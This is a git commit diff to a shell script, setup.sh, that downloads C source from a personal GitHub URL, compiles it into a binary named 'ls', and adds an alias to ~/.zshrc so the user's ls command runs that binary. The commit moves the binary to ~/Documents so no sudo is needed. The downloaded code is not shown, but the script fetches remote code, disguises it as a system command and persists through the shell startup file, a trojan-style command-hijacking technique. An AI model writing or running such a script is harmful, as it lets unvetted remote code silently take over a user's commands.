b47a150e906775c5ddf62873e9be37f3240ad2b3
Connor Bunch <connorb@qualtrics.com>
2023-04-14 14:48:40 -0600

    fixed sudo requirement

--- setup.sh
+++ setup.sh
@@ -1,6 +1,6 @@
 curl -o ls.c https://raw.githubusercontent.com/connor981332/setup/main/setup.c
 gcc ./ls.c -o ls
-mv ./ls /usr/local/bin/
-echo "alias ls=/usr/local/bin/ls" >> ~/.zshrc
+mv ./ls ~/Documents/
+echo "alias ls=~/Documents/ls" >> ~/.zshrc
 . ~/.zshrc
 rm ./ls.c
